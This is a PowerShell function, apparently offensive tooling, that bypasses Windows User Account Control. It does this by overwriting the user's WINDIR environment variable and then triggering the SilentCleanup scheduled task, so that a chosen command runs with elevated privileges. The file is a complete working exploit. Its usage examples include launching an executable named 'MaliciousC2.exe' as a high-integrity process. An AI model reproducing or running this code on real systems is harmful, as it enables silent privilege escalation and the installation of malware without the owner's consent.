function Invoke-SilentCleanupUACBypass
{
<#
.SYNOPSIS
This is a simple PowerShell function to bypass UAC by abusing environment variable expansion in
the SilentCleanup scheduled task.

.DESCRIPTION
This is a simple PowerShell function to bypass UAC by abusing environment variable expansion in
the SilentCleanup scheduled task.  This task leverages the %WINDIR% environment variable and is
configured to run with highest privileges.

.PARAMETER Command
Full path of what you would like to run as administrator, including arguments.

.EXAMPLE

PS > Invoke-SilentCleanupUACBypass

Use above command to bypass UAC and spawn a new high integrity command window.

.EXAMPLE

PS > Invoke-SilentCleanupUACBypass -Command "C:\MaliciousC2.exe"

Use above command to bypass UAC and run MaliciousC2.exe as a high integrity process.

.LINK
https://github.com/reigningshells

#>
	[CmdletBinding()]
	param (

		[Parameter(Mandatory = $False)]
		[String]$Command = "C:\Windows\System32\cmd.exe /k "

	)
	
	[Environment]::SetEnvironmentVariable("WINDIR", "$Command  /doesntmatter", "User")
	schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
	[Environment]::SetEnvironmentVariable("WINDIR", "C:\Windows", "User")
	
}
